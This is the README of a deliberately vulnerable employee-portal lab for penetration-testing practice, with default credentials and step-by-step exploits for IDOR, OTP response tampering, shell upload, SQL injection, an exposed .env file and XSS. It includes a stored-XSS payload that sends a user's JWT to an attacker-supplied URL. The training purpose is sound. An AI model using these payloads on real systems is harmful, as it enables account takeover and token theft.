# Vulnerable Employee Portal - Pentest LAB

⚠️ **WARNING: INTENTIONALLY VULNERABLE APPLICATION** ⚠️
This application contains several severe security vulnerabilities and is designed **strictly for educational and internal penetration testing purposes**. Do not deploy this application to any production or public-facing environment.

## 🚀 How to Run

Requirements: Docker and Docker Compose.

```bash
docker compose up --build
```

- Frontend is available at: `http://localhost:8080`
- Backend API is available at: `http://localhost:3000`

### Default Credentials
- **Admin**: `admin@lab.local` / `admin123`
- **User1**: `user1@lab.local` / `password123`
- **User2**: `user2@lab.local` / `password123`

---

## 🎯 Vulnerabilities to Exploit

### 1. Broken Access Control (IDOR)
**Scenario**: The Employee Directory intentionally hides other users if you are not an Admin. However, the profile endpoint does not verify ownership. Users can view and modify other users' profiles by manipulating the URL.
**Exploit**:
1. Login as `user1@lab.local` (Non-admin).
2. Go to your profile page (URL will be `/profile/2`).
3. Change the `2` in the URL to `1` (Admin ID) or `3` (User2 ID) and press Enter.
4. You can now see and edit their details (except email which is readonly on frontend, but editable via API).

### 2. OTP Bypass via Response Manipulation
**Scenario**: The frontend completely trusts the backend's `success: true` response for OTP verification.
**Exploit**:
1. Login with valid credentials.
2. At the OTP screen, enter any random 6 digits (e.g., `000000`).
3. Intercept the response using BurpSuite.
4. The server responds with `{"success":false,"message":"Invalid OTP"}`.
5. Change it to `{"success":true,"message":"OTP verified"}`.
6. Forward the modified response. You are now logged in!

### 3. File Upload Vulnerability
**Scenario**: No file extension or MIME type validation on the avatar upload.
**Exploit**:
1. Go to your profile page.
2. Create a file named `shell.php` or `xss.html` with malicious content.
3. Upload it as your avatar.
4. The file is uploaded and directly accessible at `http://localhost:3000/uploads/shell.php`.

### 4. SQL Injection
**Scenario**: The login and search endpoints use raw SQL queries without prepared statements.
**Exploit (Login Bypass)**:
1. Go to the login page.
2. Use the email: `admin@lab.local' OR '1'='1`
3. Use any password.
4. You will bypass the authentication!

**Exploit (Search UNION)**:
1. Go to Employee Directory.
2. In the search box, enter `' UNION SELECT 1, @@version, 3, 4 -- ` to leak the database version.

### 5. Sensitive Data Exposure
**Scenario**: The frontend serves the `public/` directory statically, which accidentally contains the `.env` file.
**Exploit**:
1. Open your browser or use curl.
2. Navigate to `http://localhost:8080/.env`.
3. You can read the database credentials and the JWT secret key!

### 6. Stored XSS
**Scenario**: The user profile page displays the username without proper sanitization.
**Exploit**:
1. Login and go to your profile.
2. In the Username field, input a payload like `<img src=x onerror=alert('StoredXSS')>`.
3. Click "Save Changes".
4. The page will reload and the payload will execute immediately. Every time this profile is loaded, the script will execute.

payload get jwt token: <img src=x onerror=fetch("<ISI DENGAN URL UNIK ANDA DISINI>/?token="+localStorage.getItem('access')) />

### 7. Reflected XSS
**Scenario**: The search query on the Employee Directory page is reflected back to the user without escaping HTML characters.
**Exploit**:
1. Navigate to the Employee Directory page (`/employees`).
2. In the search box, enter `<img src=x onerror=alert('ReflectedXSS')>`.
3. Click "Search".
4. The script will execute when the search results are displayed!
